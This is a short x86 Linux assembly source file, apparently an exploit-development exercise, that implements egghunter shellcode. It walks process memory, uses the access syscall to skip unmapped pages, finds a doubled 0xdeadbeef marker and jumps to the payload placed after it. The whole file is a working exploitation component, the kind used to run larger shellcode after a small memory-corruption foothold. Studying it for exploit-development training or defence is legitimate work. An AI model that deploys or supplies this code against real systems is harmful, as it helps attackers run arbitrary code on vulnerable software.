; Filename: egghunter.asm
; Author: Simon Lemire / 2018
; Description: Egghunter shellcode
; Note: Egg is '\xde\xad\xbe\xef'

global _start

section .text

_start:

	; Zero registers
	xor ecx, ecx		; ecx = 0
	mul ecx				; eax = 0, edx = 0
	mov esi, 0xdeadbeef	; our egg

	next_page:
	or dx, 0xfff		; align page 

	next_byte:
	inc edx				; set address to beginning of the memory page

	; check if we can read the memory
	xor eax, eax
	mov al, 0x21		; sys_access
	lea ebx, [edx+8]	; const char __user *filename
	int 0x80			; sys_access
	cmp al, 0xf2		; Check if we have an EFAULT
	jz next_page		; jump to next page if a fault is raised

	; search for the egg
	cmp [edx], esi
	jnz next_byte

	; search again for 2nd copy of the egg (avoid matching code itself)
	cmp [edx+4], esi
	jnz next_byte

	; egg found, jump to shellcode
	lea esi, [edx + 8]
	jmp esi
